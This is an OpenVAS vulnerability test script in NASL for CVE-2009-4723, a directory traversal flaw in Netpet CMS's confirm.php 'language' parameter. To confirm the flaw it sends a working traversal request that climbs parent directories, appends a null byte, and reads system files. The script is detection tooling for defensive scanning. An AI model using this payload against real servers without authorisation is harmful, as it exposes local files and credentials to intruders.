###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_netpet_cms_dir_trav_vuln.nasl 11657 2018-09-27 13:32:51Z cfischer $
#
# Netpet CMS Directory Traversal Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have receivedreceived a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902024");
  script_version("$Revision: 11657 $");
  script_tag(name:"last_modification", value:"$Date: 2018-09-27 15:32:51 +0200 (Thu, 27 Sep 2018) $");
  script_tag(name:"creation_date", value:"2010-03-23 15:59:14 +0100 (Tue, 23 Mar 2010)");
  script_cve_id("CVE-2009-4723");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Netpet CMS Directory Traversal Vulnerability");
  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/9333");
  script_xref(name:"URL", value:"http://www.vupen.com/english/advisories/2009/2125");

  script_tag(name:"qod_type", value:"remote_banner");
  script_copyright("Copyright (c) 2010 SecPod");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("secpod_netpet_cms_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_tag(name:"impact", value:"Successful exploitation could allow the attackers to include
  or disclose the contents of local files with the privileges of the web server.");
  script_tag(name:"affected", value:"Netpet CMS version 1.9 and prior");
  script_tag(name:"insight", value:"The flaw is due to input validation error in the 'confirm.php'
  script when processing the 'language' parameter.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The host is running Netpet CMS and is prone to directory traversal
  vulnerability.");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("http_func.inc");
include("version_func.inc");
include("misc_func.inc");

netPort = get_http_port(default:80);

netVer = get_kb_item("www/" + netPort + "/NetpetCMS");
if(isnull(netVer)){
 exit(0);
}

netVer = eregmatch(pattern:"^(.+) under (/.*)$", string:netVer);
if(!isnull(netVer[2]))
{

  files = traversal_files();

  foreach pattern(keys(files)) {
    file = files[pattern];
    url = "/confirm.php?language=../../../../../../../" + file + "%00";
    sndReq = http_get(item:string(netVer[2], url), port:netPort);
    rcvRes = http_send_recv(port:netPort, data:sndReq);
    if(egrep(pattern:pattern, string:rcvRes, icase:TRUE)) {
      report = report_vuln_url(port:netPort, url:url);
      security_message(data:report, port:netPort);
      exit(0);
    }
  }
}

if(!isnull(netVer[1]))
{
  # Netpet CMS Version <= 1.9
  if(version_is_less_equal(version:netVer[1], test_version:"1.9")){
    report = report_fixed_ver(installed_version:netVer[1], fixed_version:"WillNotFix");
    security_message(data:report, port:netPort);
    exit(0);
  }
}

exit(99);
